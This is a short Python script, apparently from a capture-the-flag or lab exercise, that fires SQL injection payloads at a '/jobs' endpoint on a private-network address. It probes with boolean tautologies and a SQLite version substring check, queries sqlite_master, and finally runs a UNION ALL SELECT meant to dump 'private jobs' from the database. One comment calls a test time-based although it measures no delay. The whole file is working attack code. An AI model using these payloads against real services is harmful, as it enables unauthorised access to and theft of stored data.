#!/usr/bin/env python3
import requests
import time

url = "http://192.168.31.233:8000/jobs"
headers = {"Content-Type": "application/json"}

# Test if we can detect differences in responses
print("[*] Testing Boolean-Based Blind SQL Injection...")

# Baseline - valid job type
baseline = requests.post(url, headers=headers, json={"job_type": "back-end"})
print(f"[+] Baseline (back-end): Status={baseline.status_code}, Length={len(baseline.text)}")

# Test 1: Always true condition
payload1 = {"job_type": "back-end' OR 'a'='a"}
resp1 = requests.post(url, headers=headers, json=payload1)
print(f"[+] Tautology (OR 'a'='a'): Status={resp1.status_code}, Length={len(resp1.text)}")

# Test 2: Always false condition
payload2 = {"job_type": "back-end' OR 'a'='b"}
resp2 = requests.post(url, headers=headers, json=payload2)
print(f"[+] False condition (OR 'a'='b'): Status={resp2.status_code}, Length={len(resp2.text)}")

# Test 3: Substring detection
print("\n[*] Testing if we can extract data via substring...")
payload3 = {"job_type": "back-end' AND (SELECT substr(sqlite_version(),1,1))='3"}
resp3 = requests.post(url, headers=headers, json=payload3)
print(f"[+] SQLite version starts with 3: Status={resp3.status_code}, Length={len(resp3.text)}")

# Test 4: Test for time-based with different DBMS
print("\n[*] Testing Time-Based SQL Injection...")
start = time.time()
payload4 = {"job_type": "back-end' AND (SELECT COUNT(*) FROM sqlite_master)>0--"}
resp4 = requests.post(url, headers=headers, json=payload4)
elapsed = time.time() - start
print(f"[+] SQLite table check: Status={resp4.status_code}, Time={elapsed:.2f}s")

# Test 5: Try to get private jobs via UNION
print("\n[*] Testing UNION-based injection...")
payload5 = {"job_type": "' UNION ALL SELECT id,name,type,description FROM jobs--"}
resp5 = requests.post(url, headers=headers, json=payload5)
print(f"[+] UNION all jobs: Status={resp5.status_code}, Response={resp5.text[:200]}")
if resp5.status_code == 200:
    try:
        data = resp5.json()
        print(f"[!] FOUND {len(data)} jobs via UNION!")
        for job in data:
            print(f"    - {job}")
    except:
        pass
